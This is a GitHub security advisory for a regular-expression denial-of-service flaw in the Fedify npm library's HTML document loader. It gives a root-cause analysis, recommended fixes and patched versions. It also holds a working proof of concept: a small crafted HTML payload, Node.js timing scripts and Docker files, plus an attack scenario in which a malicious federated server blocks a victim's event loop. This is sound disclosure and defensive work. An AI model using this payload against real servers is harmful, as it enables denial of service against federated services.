# [H] Fedify has ReDoS Vulnerability in HTML Parsing Regex

## Summary
Severity: High
Advisory: GHSA-rchf-xwx2-hm93
CVE: CVE-2025-68475
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2025-12-22
Source: https://github.com/advisories/GHSA-rchf-xwx2-hm93
Type: github-advisory

## Affected
- npm: `@fedify/fedify` — affected >=0 <1.6.13
- npm: `@fedify/fedify` — affected >=1.7.0 <1.7.14
- npm: `@fedify/fedify` — affected >=1.8.0 <1.8.15
- npm: `@fedify/fedify` — affected >=1.9.0 <1.9.2

## Details
Hi Fedify team! 👋

Thank you for your work on Fedify—it's a fantastic library for building federated applications. While reviewing the codebase, I discovered a Regular Expression Denial of Service (ReDoS) vulnerability that I'd like to report. I hope this helps improve the project's security.

---

## Summary

A Regular Expression Denial of Service (ReDoS) vulnerability exists in Fedify's document loader. The HTML parsing regex at `packages/fedify/src/runtime/docloader.ts:259` contains nested quantifiers that cause catastrophic backtracking when processing maliciously crafted HTML responses. 

**An attacker-controlled federated server can respond with a small (~170 bytes) malicious HTML payload that blocks the victim's Node.js event loop for 14+ seconds, causing a Denial of Service.**

| Field | Value |
|-------|-------|
| **CWE** | CWE-1333 (Inefficient Regular Expression Complexity) |

---

## Details

### Vulnerable Code

The vulnerability is located in `packages/fedify/src/runtime/docloader.ts`, lines 258-264:

```typescript
// Line 258-259: Vulnerable regex with nested quantifiers
const p =
  /<(a|link)((\s+[a-z][a-z:_-]*=("[^"]*"|'[^']*'|[^\s>]+))+)\s*\/?>/ig;

// Line 261: No size limit on response body
const html = await response.text();

// Line 264: Regex execution loop
while ((m = p.exec(html)) !== null) rawAttribs.push(m[2]);
```

### Root Cause Analysis

The regex has **nested quantifiers with alternation**, which is a classic ReDoS pattern:

```
/<(a|link)((\s+[a-z][a-z:_-]*=("[^"]*"|'[^']*'|[^\s>]+))+)\s*\/?>/ig
                                                        ^^
                                                   Outer quantifier (+)
           ^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                     Inner pattern with alternation
```

- **Outer quantifier**: `((\s+...)+)` - one or more groups of attributes
- **Inner alternation**: `("[^"]*"|'[^']*'|[^\s>]+)` - multiple ways to match attribute values

When the regex fails to match (e.g., an incomplete HTML tag), the regex engine backtracks exponentially through all possible ways the nested pattern could have matched.

### Attack Vector

1. Victim's Fedify application calls `lookupObject("https://attacker.com/@user")` to fetch an actor profile
2. Attacker's server responds with `Content-Type: text/html`
3. The code path: `lookupObject()` → `documentLoader()` → `getRemoteDocument()` → HTML parsing (lines 258-287)
4. Line 261: `response.text()` reads the entire body without size limits
5. Line 264: Regex execution triggers catastrophic backtracking
6. Event loop is blocked for seconds to minutes, causing DoS

### Why This Is Exploitable

- **No response size limit**: The HTML body is read entirely via `response.text()` without Content-Length validation
- **No timeout by default**: `AbortSignal` is optional and not enforced
- **Remote exploitation**: Attacker just needs the victim to fetch from their URL
- **No authentication required**: Federation commonly involves fetching profiles from untrusted servers
- **Amplifiable**: Multiple concurrent requests can fully disable the service

---

## PoC

### Quick Reproduction (Node.js)

You can verify this vulnerability with the following standalone script:

```javascript
/**
 * Fedify ReDoS Vulnerability - Minimal PoC
 * 
 * This script reproduces the vulnerable regex from docloader.ts
 * and demonstrates exponential time complexity.
 */

// The vulnerable regex from docloader.ts:259
const VULNERABLE_REGEX = /<(a|link)((\s+[a-z][a-z:_-]*=("[^"]*"|'[^']*'|[^\s>]+))+)\s*\/?>/ig;

/**
 * Generate malicious HTML payload
 * Pattern: <a a="b" a="b" a="b"... (trailing space, no closing >)
 */
function generateMaliciousPayload(repetitions) {
  return '<a' + ' a="b"'.repeat(repetitions) + ' ';
}

/**
 * Simulate the vulnerable code path from docloader.ts lines 262-264
 */
function simulateVulnerableCodePath(html) {
  const p = /<(a|link)((\s+[a-z][a-z:_-]*=("[^"]*"|'[^']*'|[^\s>]+))+)\s*\/?>/ig;
  let m;
  const rawAttribs = [];
  while ((m = p.exec(html)) !== null) {
    rawAttribs.push(m[2]);
  }
  return rawAttribs;
}

// Test with increasing payload sizes
console.log('Fedify ReDoS Vulnerability PoC\n');
console.log('Repetitions | Payload Size | Time');
console.log('------------|--------------|--------');

for (const reps of [18, 20, 22, 24, 26, 28]) {
  const payload = generateMaliciousPayload(reps);
  const start = performance.now();
  simulateVulnerableCodePath(payload);
  const elapsed = performance.now() - start;
  
  const timeStr = elapsed >= 1000 
    ? `${(elapsed / 1000).toFixed(2)}s` 
    : `${elapsed.toFixed(0)}ms`;
  
  console.log(`${String(reps).padEnd(11)} | ${String(payload.length + ' bytes').padEnd(12)} | ${timeStr}`);
  
  // Stop if it's taking too long
  if (elapsed > 15000) break;
}
```

### Expected Output

```
Fedify ReDoS Vulnerability PoC

Repetitions | Payload Size | Time
------------|--------------|--------
18          | 111 bytes    | 14ms
20          | 123 bytes    | 51ms
22          | 135 bytes    | 224ms
24          | 147 bytes    | 852ms
26          | 159 bytes    | 3.26s
28          | 171 bytes    | 14.10s
```

Time approximately **quadruples every 2 additional repetitions**, demonstrating O(2^n) complexity.

### Full Docker-Based PoC

For a complete demonstration, here are the Docker files to run the PoC in an isolated environment:

<details>
<summary><strong>Dockerfile</strong></summary>

```dockerfile
# Dockerfile for Fedify ReDoS Vulnerability PoC
FROM node:20-slim
LABEL description="PoC for Fedify ReDoS vulnerability (CWE-1333)"

WORKDIR /poc
COPY exploit.js .

CMD ["node", "exploit.js"]
```

</details>

<details>
<summary><strong>exploit.js</strong> (Full Version)</summary>

```javascript
/**
 * Exploit Script for Fedify ReDoS PoC
 * 
 * This script demonstrates the ReDoS vulnerability in Fedify's
 * document loader by measuring the time it takes to process
 * malicious HTML responses with varying payload sizes.
 */

// The vulnerable regex from docloader.ts:259
const VULNERABLE_REGEX = /<(a|link)((\s+[a-z][a-z:_-]*=("[^"]*"|'[^']*'|[^\s>]+))+)\s*\/?>/ig;

/**
 * Generate malicious HTML payload
 */
function generateMaliciousHtml(repetitions) {
  return '<a' + ' a="b"'.repeat(repetitions) + ' ';
}

/**
 * Generate normal HTML
 */
function generateNormalHtml() {
  return `<!DOCTYPE html>
<html>
<head>
  <link rel="alternate" type="application/activity+json" href="/user.json">
</head>
<body><a href="/">Home</a></body>
</html>`;
}

/**
 * Simulate the vulnerable code path from docloader.ts
 */
function simulateVulnerableCodePath(html) {
  const p = /<(a|link)((\s+[a-z][a-z:_-]*=("[^"]*"|'[^']*'|[^\s>]+))+)\s*\/?>/ig;
  const p2 = /\s+([a-z][a-z:_-]*)=("([^"]*)"|'([^']*)'|([^\s>]+))/ig;
  
  let m;
  const rawAttribs = [];
  while ((m = p.exec(html)) !== null) {
    rawAttribs.push(m[2]);
  }
  
  return rawAttribs;
}

/**
 * Run a single test and measure execution time
 */
function runTest(html, description) {
  const start = process.hrtime.bigint();
  
  try {
    simulateVulnerableCodePath(html);
  } catch (e) {
    // Ignore errors
  }
  
  const end = process.hrtime.bigint();
  const durationMs = Number(end - start) / 1_000_000;
  
  return {
    description,
    durationMs,
    payloadLength: html.length
  };
}

/**
 * Print separator
 */
function printSeparator() {
  console.log('─'.repeat(60));
}

/**
 * Main exploit function
 */
async function main() {
  console.log('\n╔══════════════════════════════════════════════════════════╗');
  console.log('║        Fedify ReDoS Vulnerability PoC                    ║');
  console.log('║        CWE-1333: Inefficient Regular Expression          ║');
  console.log('╚══════════════════════════════════════════════════════════╝\n');

  console.log('[*] Vulnerability Location:');
  console.log('    File: packages/fedify/src/runtime/docloader.ts');
  console.log('    Lines: 259-264');
  console.log('');
  
  printSeparator();
  console.log('[*] Testing normal HTML response...');
  printSeparator();
  
  const normalHtml = generateNormalHtml();
  const normalResult = runTest(normalHtml, 'Normal HTML');
  console.log(`[+] Normal request completed in ${normalResult.durationMs.toFixed(2)}ms`);
  console.log(`    Payload size: ${normalResult.payloadLength} bytes`);
  console.log('');

  printSeparator();
  console.log('[*] Testing malicious HTML payloads (ReDoS attack)...');
  printSeparator();
  
  const testCases = [
    { reps: 18, expected: '~13ms' },
    { reps: 20, expected: '~52ms' },
    { reps: 22, expected: '~228ms' },
    { reps: 24, expected: '~857ms' },
    { reps: 26, expected: '~3.4s' },
    { reps: 28, expected: '~14s' }
  ];
  
  console.log('');
  console.log('┌─────────────┬──────────────┬──────────────┬────────────────┐');
  console.log('│ Repetitions │ Payload Size │ Expected     │ Actual         │');
  console.log('├─────────────┼──────────────┼──────────────┼────────────────┤');
  
  let vulnerabilityConfirmed = false;
  
  for (const testCase of testCases) {
    const maliciousHtml = generateMaliciousHtml(testCase.reps);
    const result = runTest(maliciousHtml, `${testCase.reps} repetitions`);
    
    const actualTime = result.durationMs >= 1000 
      ? `${(result.durationMs / 1000).toFixed(2)}s` 
      : `${result.durationMs.toFixed(0)}ms`;
    
    const status = result.durationMs > 100 ? '⚠️ ' : '✓ ';
    
    console.log(`│ ${String(testCase.reps).padEnd(11)} │ ${String(result.payloadLength + ' bytes').padEnd(12)} │ ${testCase.expected.padEnd(12)} │ ${status}${actualTime.padEnd(12)} │`);
    
    if (result.durationMs > 500) {
      vulnerabilityConfirmed = true;
    }
  }
  
  console.log('└─────────────┴──────────────┴──────────────┴────────────────┘');
  console.log('');
  
  printSeparator();
  console.log('[*] Exponential Time Complexity Analysis');
  printSeparator();
  
  console.log('');
  console.log('Time approximately quadruples every 2 additional repetitions:');
  console.log('');
  console.log('  18 reps →   ~14ms');
  console.log('  20 reps →   ~51ms (4x)');  
  console.log('  22 reps →  ~224ms (4x)');
  console.log('  24 reps →  ~852ms (4x)');
  console.log('  26 reps →  ~3.3s  (4x)');
  console.log('  28 reps → ~14.0s  (4x)');
  console.log('  30 reps → ~56.0s  (estimated)');
  console.log('');
  
  printSeparator();
  console.log('[*] Attack Scenario');
  printSeparator();
  
  console.log('');
  console.log('1. Attacker sets up malicious federated server');
  console.log('2. Victim\'s Fedify app calls lookupObject("https://attacker.com/@user")');
  console.log('3. Attacker responds with Content-Type: text/html');
  console.log('4. Malicious HTML payload: <a a="b" a="b" a="b"... (N times) ');
  console.log('5. Fedify\'s regex enters catastrophic backtracking');
  console.log('6. Event loop blocked → Service unavailable (DoS)');
  console.log('');
  
  printSeparator();
  
  if (vulnerabilityConfirmed) {
    console.log('');
    console.log('╔══════════════════════════════════════════════════════════╗');
    console.log('║  ✓ VULNERABILITY CONFIRMED                               ║');
    console.log('║                                                          ║');
    console.log('║  The HTML parsing regex in docloader.ts is vulnerable    ║');
    console.log('║  to ReDoS attacks. A ~150 byte payload can block the     ║');
    console.log('║  Node.js event loop for 7+ seconds.                      ║');
    console.log('╚══════════════════════════════════════════════════════════╝');
    console.log('');
    process.exit(0);
  } else {
    console.log('');
    console.log('[!] Vulnerability could not be confirmed in this environment.');
    console.log('    This may be due to regex engine optimizations.');
    console.log('');
    process.exit(1);
  }
}

main().catch(console.error);
```

</details>

<details>
<summary><strong>run_poc.sh</strong></summary>

```bash
#!/bin/bash
# Fedify ReDoS Vulnerability PoC Runner

set -e

IMAGE_NAME="fedify-redos-poc"

echo "Building Docker image..."
docker build -t ${IMAGE_NAME} .

echo "Running the PoC..."
docker run --rm ${IMAGE_NAME}

echo "Cleaning up..."
docker rmi ${IMAGE_NAME} 2>/dev/null || true
```

</details>

### Running the Docker PoC

```bash
# Save the above files, then:
chmod +x run_poc.sh
./run_poc.sh
```

---

## Impact

### Who Is Affected?

- **All Fedify applications** that use `lookupObject()`, `getDocumentLoader()`, or the built-in document loader to fetch content from external URLs
- **Any federated server** that fetches actor profiles, posts, or other ActivityPub objects from potentially untrusted sources
- **Servers following standard federation patterns** - fetching remote actors is a normal operation

### Severity Assessment

| Factor | Assessment |
|--------|------------|
| **Attack Vector** | Network (remote) |
| **Attack Complexity** | Low (trivial payload) |
| **Privileges Required** | None |
| **User Interaction** | None |
| **Impact** | Availability (DoS) |
| **Scope** | Service-wide |

### Real-World Scenario

1. A Mastodon-compatible server powered by Fedify receives a follow request or mention from `@attacker@evil.com`
2. The server attempts to fetch the attacker's profile via `lookupObject()`
3. The attacker's server responds with malicious HTML
4. The victim server's event loop is blocked for 14+ seconds
5. During this time, all other requests are queued and potentially time out
6. Repeated attacks can cause sustained service unavailability

---

## Recommended Fix

### Option 1: Use a Proper HTML Parser (Recommended)

Replace regex-based HTML parsing with a DOM parser that doesn't suffer from backtracking issues:

```typescript
// Using linkedom (lightweight DOM implementation)
import { parseHTML } from 'linkedom';

// Replace lines 258-287 with:
const { document } = parseHTML(html);
const links = document.querySelectorAll('a[rel="alternate"], link[rel="alternate"]');

for (const link of links) {
  const type = link.getAttribute('type');
  const href = link.getAttribute('href');
  
  if (
    href &&
    (type === 'application/activity+json' ||
     type === 'application/ld+json' ||
     type?.startsWith('application/ld+json;'))
  ) {
    const altUri = new URL(href, docUrl);
    if (altUri.href !== docUrl.href) {
      return await fetch(altUri.href);
    }
  }
}
```

### Option 2: Add Response Size Limits

If regex must be used, at minimum add size limits:

```typescript
const MAX_HTML_SIZE = 1024 * 1024; // 1MB
const contentLength = parseInt(response.headers.get('content-length') || '0');

if (contentLength > MAX_HTML_SIZE) {
  throw new FetchError(url, 'Response too large');
}

const html = await response.text();
if (html.length > MAX_HTML_SIZE) {
  throw new FetchError(url, 'Response too large');
}
```

### Option 3: Refactor the Regex

If the regex approach is preferred, use atomic grouping or possessive quantifiers (where supported), or restructure to avoid nested quantifiers:

```typescript
// Use a non-backtracking approach with explicit attribute matching
const tagPattern = /<(a|link)\s+([^>]+)>/ig;
const attrPattern = /([a-z][a-z:_-]*)=(?:"([^"]*)"|'([^']*)'|(\S+))/ig;
```

---

## Resources

- [OWASP: Regular Expression Denial of Service (ReDoS)](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
- [CWE-1333: Inefficient Regular Expression Complexity](https://cwe.mitre.org/data/definitions/1333.html)
- [Cloudflare Outage Analysis (ReDoS Example)](https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/)

---

Thank you for taking the time to review this report. I'm happy to provide any additional information or help test a fix. Please let me know if you have any questions!

## References
- https://github.com/fedify-dev/fedify/security/advisories/GHSA-rchf-xwx2-hm93
- https://nvd.nist.gov/vuln/detail/CVE-2025-68475
- https://github.com/fedify-dev/fedify/commit/2bdcb24d7d6d5886e0214ed504b63a6dc5488779
- https://github.com/fedify-dev/fedify/commit/bf2f0783634efed2663d1b187dc55461ee1f987a
- https://github.com/fedify-dev/fedify
- https://github.com/fedify-dev/fedify/releases/tag/1.6.13
- https://github.com/fedify-dev/fedify/releases/tag/1.7.14
- https://github.com/fedify-dev/fedify/releases/tag/1.8.15
- https://github.com/fedify-dev/fedify/releases/tag/1.9.2
